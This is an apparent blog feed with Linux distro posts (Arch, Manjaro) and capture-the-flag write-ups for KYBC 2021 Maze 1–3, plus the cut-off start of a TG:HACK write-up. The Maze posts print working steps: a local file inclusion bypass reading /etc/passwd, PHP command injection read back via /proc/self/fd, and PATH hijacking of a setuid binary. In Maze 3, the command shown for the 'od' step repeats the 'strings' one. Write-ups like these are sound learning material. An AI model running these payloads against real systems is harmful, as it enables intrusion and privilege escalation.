&lt;/ul&gt;</content><category term="linux"></category><category term="linux"></category><category term="arch"></category><category term="intel"></category><category term="systemd-boot"></category><category term="troubleshooting"></category></entry><entry><title>Oh btw, I use Arch</title><link href="https://railslide.io/oh-btw-i-use-arch.html" rel="alternate"></link><published>2022-01-31T00:00:00+01:00</published><updated>2022-01-31T00:00:00+01:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2022-01-31:/oh-btw-i-use-arch.html</id><summary type="html">&lt;p&gt;Somehow I ended up on Arch and so far I'm liking it.&lt;/p&gt;</summary><content type="html">&lt;p&gt;I was happily running Manjaro when my computer started to crash multiple times per day. I tried debugging but that did not lead anywhere (it will later turn out to be a hardware issue). So, out of ideas I decided to see if the problem was Manjaro specific and if another distro would solve. And it was at that point that a friend somehow convinced me to give Arch a shot.&lt;/p&gt;
&lt;h2&gt;My approach to Arch&lt;/h2&gt;
&lt;p&gt;The main reason why I've never considered Arch before it was probably that I had the misfortune to run into some terrible Arch users in the past. You know, the &lt;em&gt;Ubuntu is for noobs, installing and running Arch is so complicated, I made it and hence I'm better than you&lt;/em&gt; kind of people. So in my mind Arch was pretty much an elitist overcomplicated distro and I didn't really see any good reason for giving it a shot.&lt;/p&gt;
&lt;p&gt;What changed my mind then? Well, it has been a combination of things. On one hand - thanks to Manjaro - I got exposed to AUR (Arch User Repository) and grew fond of it. Then on April 1st Arch had released an installer (fun fact: due to the date many thought it was an April's fool) removing the need to install Arch from scratch. Plus, I was extremely frustrated by the frequent crashes and if Arch was the solution so be it.&lt;/p&gt;
&lt;p&gt;On the other hand I realized that a bunch of awesome people in my life were in fact using Arch (I probably had run into nice Arch users even before, but since they didn't go around boosting how cool they were for using Arch I had probably missed that). Plus a part of me secretly regarded Arch as a sort of mandatory step/rite of passage in my linux journey, so when a friend suggested to give Arch a shot I just assumed that the time for it had come.&lt;/p&gt;
&lt;p&gt;I must say, however, that even though I had bought in to the idea of installing Arch, my expectation was very much of giving it try, finding it too complicated/elitist, and moving to another distro. It turned out that I was very wrong.&lt;/p&gt;
&lt;h2&gt;Installing Arch&lt;/h2&gt;
&lt;p&gt;Thanks to the shiny new installer, the process of installing Arch was generally straightforward. The only part I didn't find very intuitive was accessing the wifi from TTY. Thankfully a friend had provided me with instructions, so that went smoothly as well. For the sake of my future self, here they are:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;iwctl&lt;/span&gt;
&lt;span class="nv"&gt;stations&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;list&lt;/span&gt;
&lt;span class="nv"&gt;stations&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nv"&gt;probably&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;wlan0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;but&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;whatever&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;is&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;listed&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;in&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;list&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;connect&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nv"&gt;SSID&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The rest went through without too much hassle. A good idea was however to have another computer or a phone ready at hand, for those few times where I felt the need to google something during the process.&lt;/p&gt;
&lt;h2&gt;My first steps into the Arch world&lt;/h2&gt;
&lt;p&gt;My first impression of Arch was that it was very... bare. Being used to distros with a bespoken desktop environment, I was a bit caught off guard when I first logged in. I had picked Gnome during the installation and what I got was indeed Gnome, just stripped to the bare minimum - anything else I wanted I had to install it myself. Don't get me wrong though, that's a good thing! Yes, I did have to figure out what was the name of the components I wanted and how to install them, but after a bit of fiddling I got my DE to work, look and feel exactly the way I wanted. And if that's not the beauty of linux in a nutshell, I don't what that is.&lt;/p&gt;
&lt;p&gt;Another thing I noticed is the speed of my system. Compared to a fresh installation of Ubuntu, Arch is just blazing fast. I guess that's probably one of the perks on of not having a lot of useless software installed from the start. Again, yes, I had to install everything I need out of the box, but that also means my system resources are spent only on programs I actually use.&lt;/p&gt;
&lt;p&gt;Last but not least, I cannot really stress enough what an amazing documentation and community Arch has. The internet is full of people praising the Arch wiki and I totally agree - for 99% of the issues I encountered the solution was documented there. And the remaining 1% was usually covered by the &lt;a href="https://bbs.archlinux.org/"&gt;Arch Linux Forum on BBS&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Package management&lt;/h2&gt;
&lt;p&gt;When I mentioned to people that I was considering Arch (the fist step of installing Arch is to tell everyone that you're installing Arch :D), I got many warnings around package management. They mostly boiled down to two topics: rolling releases and Aur packages.&lt;/p&gt;
&lt;p&gt;The main critique with rolling releases is that you need to monitor which packages you're installing, since you might end up with something &lt;em&gt;too new&lt;/em&gt; to play nice with the rest of them. My experience with it is that, while I do pay a bit more attention when critical packages show up in the list (e.g. new kernel, or Gnome related stuff), I've yet to end up in such a scenario. Maybe I'm just lucky, but so far these 8 months have been smooth from that perspective.&lt;/p&gt;
&lt;p&gt;Even with AUR packages my experience has been just positive. It probably helps that I'm comfortable with reading code, but having to check the PKGBUILD file before installing a package is not that big of a hassle for me. And I really love the concept of a community-driven package repository! Plus now that thanks to Yay (if you don't use it, have a look at it - it's awesome!) I can handle both AUR and Arch packages from the same place, I'm an even happier camper.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;All in all, I'm very happy with Arch. While it probably isn't the perfect distro for everyone (is there such a thing?), it certainly turned out to be a great fit for me.&lt;/p&gt;</content><category term="linux"></category><category term="os"></category><category term="linux"></category><category term="distro"></category><category term="arch"></category></entry><entry><title>Switching from Ubuntu to Manjaro</title><link href="https://railslide.io/switching-from-ubuntu-to-manjaro.html" rel="alternate"></link><published>2021-12-26T00:00:00+01:00</published><updated>2021-12-26T00:00:00+01:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2021-12-26:/switching-from-ubuntu-to-manjaro.html</id><summary type="html">&lt;p&gt;After many years on Ubuntu I decided it was time for some distro hopping and I gave Manjaro a spin.&lt;/p&gt;</summary><content type="html">&lt;p&gt;I've been an Ubuntu user for about 14 years and while I have been using other distros (mostly on servers) from time to time, I never felt the need to switch away from it. Lately though a mix of curiosity and some Ubuntu stuff rubbing my nerves gave me the nudge to try something else. I had heard good things about Manjaro, so I decided to give it a shot.&lt;/p&gt;
&lt;h2&gt;What's wrong with Ubuntu?&lt;/h2&gt;
&lt;p&gt;Let's be clear, I don't hate Ubuntu. I still believe it's a great distro and definitely a great candidate for beginner and experienced users alike. That said, there were some things that annoyed me.&lt;/p&gt;
&lt;p&gt;At the top of the list of my pain points there were Snap packages. When they were announced I thought it was a great idea. Containerized, cross-distribution applications - what's not to like? But while theory was great, practice turned out to be fairly mediocre: snap packages are slow, they clutter the filesystem, and they don't always work with your system theme. AppImage and Flatpak are way better alternatives and I would take them over Snap every given day.&lt;/p&gt;
&lt;p&gt;Besides not being a not-so-great user experience, Snap packages also come with some ethical concerns. Ideally if I don't like them I could just stay away from them, right? Unfortunately that's easier said than done. Since Ubuntu 20.04 installing Chromium via Apt will install Chromium as a Snap package instead of a native one. &lt;a href="https://snapcraft.io/blog/chromium-in-ubuntu-deb-to-snap-transition"&gt;The reason for this change was that the native package required developers to build releases for every supported version Ubuntu, while Snap allows them to maintain a single package that works on all of them&lt;/a&gt;. The problem though is that this switcharoo happens without warning or asking the user. Don't get me wrong, as a developer myself I understand that maintaining Chromium might have been a gigantic pain in the ass, but I also believe that simply printing out a notice rather than go ahead and install a snap package would have gone a long way.&lt;/p&gt;
&lt;p&gt;On a similar note, I was also surprised to discover that Ubuntu Disk Creator doesn't support ISO images for anything other than Ubuntu and its flavours. I am aware that this is old news, but I still found it fairly irritating, since it felt a bit like being punished (&lt;em&gt;no GUI for you!&lt;/em&gt;) for going for a different distro. Also, the fact that the official Ubuntu guide suggested two ppa as alternatives was not super encouraging either. And while this wasn't a deal breaker per se, it added up to my frustration. So, when the opportunity came along in the form of a new work laptop, I decided it was time to explore the distro landscape.&lt;/p&gt;
&lt;h2&gt;Enter Manjaro&lt;/h2&gt;
&lt;p&gt;Manjaro is a user-friendly distro based on Arch, which means rolling releases and access to the Arch User Repository (AUR). It also comes with its own dedicated software repositories, a graphical installer, automatic hardware detection, and pre-installed codecs.&lt;/p&gt;
&lt;h3&gt;The good parts&lt;/h3&gt;
&lt;p&gt;Being based on Arch, Manjaro is fast and has a low memory footprint. Installation goes in a breeze (around 2 minutes!) and I was surprised on how little it took me to have it up and running. I later installed Ubuntu on the same machine and it felt like waiting for ages in comparison.&lt;/p&gt;
&lt;p&gt;The next thing I really appreciated with Manjaro is that it gives the user a lot of freedom when it comes to customization. Take the desktop environment for example: the Manjaro development team provides and maintains XFCE, KDE and Gnome editions out of the box. On top of that, the community maintains 6 additional flavours (i3, Budgie, Cinnamon, Deepin, Mate, and Sway). So, whatever is favourite DE, you're likely to get it covered.&lt;/p&gt;
&lt;p&gt;Another awesome feature is that Manjaro natively supports Flatpak, Snap, and Aur packages. Whatever you want to use it's up to you, all it takes is toggling a setting in the package manager. No more surprise Snap packages popping up in your system - if you want to use Snap you do, if you don't you don't.&lt;/p&gt;
&lt;p&gt;I also loved the extensive community support. Besides the already mentioned community editions, Manjaro also has an extensive an lively forum where users can get help from other community members. This reminded me of Ask Ubuntu (definitely one of Ubuntu's strengths in my opinion!) and I was very pleased to see that Manjaro had something similar - in 99% of the cases I stumbled on some issue or had doubts, a quick search on there provided me with all the answers I needed.&lt;/p&gt;
&lt;p&gt;Last but not least, Manjaro looks good. While aesthetic is not my primary concern when it comes to choosing an operative system, I must admit that I always found Ubuntu's default appearance somehow outdated and not very appealing. Again, not a breaking deal per se, but it was refreshing to work on something that pleased the eye without any further action on my side.&lt;/p&gt;
&lt;h3&gt;The bad parts&lt;/h3&gt;
&lt;p&gt;While in general I really liked Manjaro, it would be a lie to say that it is free from flaws.&lt;/p&gt;
&lt;p&gt;My major complain about it are its disk encryption settings. By default if you decide to encrypt your disk, Manjaro will encrypt everything including the boot partition. The good part is that an encrypted boot partition comes with the perk of not being vulnerable to an &lt;a href="https://en.wikipedia.org/wiki/Evil_maid_attack"&gt;evil maid attack&lt;/a&gt;. Though the bad part is that it comes with several drawbacks on your day-to-day activities, such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Decryption is slow because it cannot leverage hardware acceleration and it can takes up to 20/30 seconds. So booting your computer takes time.&lt;/li&gt;
&lt;li&gt;You only have one try to type the decryption key correctly. If you make a typo, you'll have to reboot.&lt;/li&gt;
&lt;li&gt;The correct keyboard layout is not loaded yet, so if you're using special chars good luck with that.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A workaround for it is to do a manual partitioning and leave &lt;code&gt;/boot&lt;/code&gt; unencrypted. However documentation and/or steps-by-steps instructions for how to do it are not easy to find, and even if you know how to do it you might still bump into some &lt;a href="https://github.com/calamares/calamares/issues/1073"&gt;installer bug&lt;/a&gt; and end up with an unbootable system.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;In general I got a really nice impression of Manjaro and I definitely landed in my list of recommended distros.&lt;/p&gt;
&lt;p&gt;Will I stay with it? Well, I ended up not to. Due to frequent crashes to my machine, I tried to install other distros to see if it was something related to Manjaro. While the problem turned out to be a hardware issue, the debugging process resulted in me stumbling on the above Calamares bug when trying to go back to Manjaro, getting frustrated, and eventually install something else (more on this in another post!). That said, I'd be more than willing to give Manjaro another chance in the future, once such bug gets fixed.&lt;/p&gt;
&lt;p&gt;TL;DR: a great distro, with some encryption pain.&lt;/p&gt;</content><category term="linux"></category><category term="os"></category><category term="linux"></category><category term="distro"></category><category term="manjaro"></category><category term="ubuntu"></category></entry><entry><title>KYBC 2021 - Maze 3 Writeup</title><link href="https://railslide.io/kybc-yogosha-2021-maze-3-writeup.html" rel="alternate"></link><published>2021-03-24T00:00:00+01:00</published><updated>2021-03-24T00:00:00+01:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2021-03-24:/kybc-yogosha-2021-maze-3-writeup.html</id><summary type="html">&lt;p&gt;Writeup for Maze 3 challenge at KYBC CTF&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;em&gt;In order to start this challenge it was necessary to complete &lt;a href="https://railslide.io/kybc-yogosha-2021-maze-2-writeup.html"&gt;Maze 2&lt;/a&gt; first&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Third maze, third user. Let's check what's in &lt;code&gt;home/ctf_user3&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="nb"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ls -al /home/ctf_user3&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It looks like ctf_user2 owns &lt;code&gt;image.txt&lt;/code&gt; and &lt;code&gt;RAnd0m&lt;/code&gt;. Hovewer, neither concatenating the content of &lt;code&gt;image.txt&lt;/code&gt; nor running the &lt;code&gt;RAnd0m&lt;/code&gt; executable bring anything useful.&lt;/p&gt;
&lt;p&gt;Let's try to inspect the binary then with the good ol' &lt;code&gt;strings&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="nb"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;echo &amp;quot;strings /home/ctf_user3/RAnd0M&amp;quot; &amp;gt; /tmp/date &amp;amp;&amp;amp; chmod 777 /tmp/date &amp;amp;&amp;amp; export PATH=/tmp:$PATH &amp;amp;&amp;amp; /home/ctf_user2/sysadmin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;No luck. What about &lt;code&gt;od&lt;/code&gt; then?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="nb"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;echo &amp;quot;strings /home/ctf_user3/RAnd0M&amp;quot; &amp;gt; /tmp/date &amp;amp;&amp;amp; chmod 777 /tmp/date &amp;amp;&amp;amp; export PATH=/tmp:$PATH &amp;amp;&amp;amp; /home/ctf_user2/sysadmin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Well that worked. Now I only need to figure out how to get out a proper hexdump from it. After a bit of digging, the &lt;code&gt;man&lt;/code&gt; page comes to the rescue and provides with the syntax I need.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="nb"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;echo &amp;quot;od -A x -t x1z -v /home/ctf_user3/RAnd0M&amp;quot; &amp;gt; /tmp/date &amp;amp;&amp;amp; chmod 777 /tmp/date &amp;amp;&amp;amp; export PATH=/tmp:$PATH &amp;amp;&amp;amp; /home/ctf_user2/sysadmin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let's copy the hex dump into a txt file in my machine, recreate the binary and finally run &lt;code&gt;strings&lt;/code&gt; on it&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;xxd -r -p rand.txt out.bin
strings out.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;One of the strings seems to match the flag pattern &lt;code&gt;pvkq{dbiH._dy_pvkqH.E.H.U.H._wo_?}&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Running it through a &lt;a href="http://theblob.org/rot.cgi?"&gt;ROT decoder&lt;/a&gt; gives me &lt;code&gt;flag{tryX._to_flagX.U.X.K.X._me_?}&lt;/code&gt;. Since the flag doesn't look too right and the system doesn't accept anyway, let's assume I probably messed up something while tinkering with &lt;code&gt;od&lt;/code&gt; and manually fix it: &lt;code&gt;flag{try_to_flag_me_?}&lt;/code&gt;.&lt;/p&gt;</content><category term="ctf"></category><category term="ctf"></category><category term="lfi"></category><category term="rce"></category><category term="kybc"></category></entry><entry><title>KYBC 2021 - Maze 2 Writeup</title><link href="https://railslide.io/kybc-yogosha-2021-maze-2-writeup.html" rel="alternate"></link><published>2021-03-22T00:00:00+01:00</published><updated>2021-03-22T00:00:00+01:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2021-03-22:/kybc-yogosha-2021-maze-2-writeup.html</id><summary type="html">&lt;p&gt;Writeup for Maze 2 challenge at KYBC CTF&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;em&gt;In order to start this challenge it was necessary to complete &lt;a href="https://railslide.io/kybc-yogosha-2021-maze-1-writeups.html"&gt;Maze 1&lt;/a&gt; first&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;After catching the first flag, let's check what's in &lt;code&gt;home/ctf_user2&lt;/code&gt;. There is a flag file, but this time concatenating it doesn't work since the current user (&lt;code&gt;ctf_user1&lt;/code&gt;) doesn't have read permissions to it. The only other interesting thing is a file called &lt;code&gt;sysadmin.c&lt;/code&gt;. Permissions are in my favor this time, so let's have a look at the content:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Hello sysadmin :) &lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Today date : &lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;setreuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;getuid&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;That &lt;code&gt;system("date")&lt;/code&gt; call looks promising, so let's try to replace it with some useful bash statement instead:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="nb"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;echo &amp;quot;cat /home/ctf_user2/.52942ab6e8a6dd0bd75a9029c2b5c574_flag2.txt&amp;quot; &amp;gt; /tmp/date &amp;amp;&amp;amp; chmod 777 /tmp/date &amp;amp;&amp;amp; export PATH=/tmp:$PATH &amp;amp;&amp;amp; /home/ctf_user2/sysadmin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Check the proc file and catch the flag - success!&lt;/p&gt;</content><category term="ctf"></category><category term="ctf"></category><category term="lfi"></category><category term="rce"></category><category term="kybc"></category></entry><entry><title>KYBC 2021 - Maze 1 Writeup</title><link href="https://railslide.io/kybc-yogosha-2021-maze-1-writeups.html" rel="alternate"></link><published>2021-03-17T00:00:00+01:00</published><updated>2021-03-17T00:00:00+01:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2021-03-17:/kybc-yogosha-2021-maze-1-writeups.html</id><summary type="html">&lt;p&gt;Writeup for Maze 1 challenge at KYBC CTF&lt;/p&gt;</summary><content type="html">&lt;p&gt;The site is basically a search box that checks for matching txt files and then redirects to &lt;code&gt;http://5.150.254.85:8082/lookup.php?f=file.txt&lt;/code&gt; to display the content of the file. &lt;code&gt;flag.txt&lt;/code&gt; obviously leads to a fake flag, but the whole thing looks like a potential LFI.&lt;/p&gt;
&lt;p&gt;Trying to reach a file with an extension other than &lt;code&gt;.txt&lt;/code&gt; results in an error. However, appending an extra &lt;code&gt;f&lt;/code&gt; parameters after one with the &lt;code&gt;.txt&lt;/code&gt; extension lets me bypass the extension check and access the content of the last file.&lt;/p&gt;
&lt;p&gt;The txt files are inside a &lt;code&gt;files/&lt;/code&gt; folder and there seem to be some sort of sanitization mechanism, since &lt;code&gt;../&lt;/code&gt; get stripped away. However, the filter applies only to that specific pattern, so &lt;code&gt;....//&lt;/code&gt; becomes &lt;code&gt;../&lt;/code&gt; after sanitation and allows me to look up into the parent folder.&lt;/p&gt;
&lt;p&gt;Combining the two bypasses together gets me the &lt;code&gt;etc/passwd&lt;/code&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;http://5.150.254.85:8082/lookup.php?f=flag.txt&amp;amp;f=....//....//....//....//etc/passwd`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The flag doesn't seem to be there though.&lt;/p&gt;
&lt;p&gt;Let's see if it is possible to turn this LFI into an RCE, since trying to guess name and location of the flag doesn't sound like a realistic strategy.&lt;/p&gt;
&lt;p&gt;By examining the &lt;code&gt;proc/self/fd&lt;/code&gt; folder I discover that &lt;code&gt;proc/self/fd/11&lt;/code&gt; stores the serialized parameters of the search request. Let's see if we can write by making a POST request containing &lt;code&gt;&amp;lt;?php system('id'); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;http://5.150.254.85:8082/search=%3C%3Fphp+system%28%27id%27%29%3B+%3F%3E&amp;amp;submit=submit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;and check the proc file again&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;http://5.150.254.85:8082/lookup.php?f=flag.txt&amp;amp;f=....//....//....//....//proc/self/fd/11
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Yeah! The code gets executed and the result gets saved into it!!&lt;/p&gt;
&lt;p&gt;Let's run &lt;code&gt;ls /&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;http://5.150.254.85:8082/search=%3C%3Fphp%20system%28%27ls%20-al%27%29%3B%20%3F%3E&amp;amp;submit=submit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;and check the outcome in the proc file. No flag in the root folder, but &lt;code&gt;home/ctf_user1&lt;/code&gt; seems interesting:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;http://5.150.254.85:8082/search=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%6c%73%20%2d%61%6c%20%2f%68%6f%6d%65%2f%63%74%66%5f%75%73%65%72%31%27%29%3b%20%3f%3e&amp;amp;submit=submit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;there's the flag - let's cat it!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;http://5.150.254.85:8082/search=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%63%61%74%20%2f%68%6f%6d%65%2f%63%74%66%5f%75%73%65%72%31%2f%2e%33%33%36%64%35%65%62%63%35%34%33%36%35%33%34%65%36%31%64%31%36%65%36%33%64%64%66%63%61%33%32%37%5f%66%6c%61%67%31%2e%74%78%74%27%29%3b%20%3f%3e&amp;amp;submit=submit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Success! &lt;code&gt;FLAG_c4a66ead822b8d2dd42da826eb180371&lt;/code&gt;&lt;/p&gt;</content><category term="ctf"></category><category term="ctf"></category><category term="lfi"></category><category term="rce"></category><category term="kybc"></category></entry><entry><title>TG:HACK 2020 Writeup - A game of keys</title><link href="https://railslide.io/tghack-2020-writeup-a-game-of-keys.html" rel="alternate"></link><published>2020-04-18T00:00:00+02:00</published><updated>2020-04-18T00:00:00+02:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2020-04-18:/tghack-2020-writeup-a-game-of-keys.html</id><summary type="html">&lt;p&gt;During Easter I played the TG:HACK 2020 CTF. Here' is my writeup for the &lt;em&gt;A game of keys&lt;/em&gt; challenge.&lt;/p&gt;</summary><content type="html">&lt;blockquote&gt;
&lt;p&gt;Download this file and get the flag. You will also need this wordlist.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The provided files are a python compiled file (keygame.pyc) and a txt file with a list of gibberish words (wordlist.txt). The wordlist didn't seem very interesting, so I proceeded to decompile the python file&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;uncompyle6&lt;span class="w"&gt; &lt;/span&gt;keygame.pyc&lt;span class="w"&gt; &lt;/span&gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;keygame.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And had a look at the source code&lt;/p&gt;
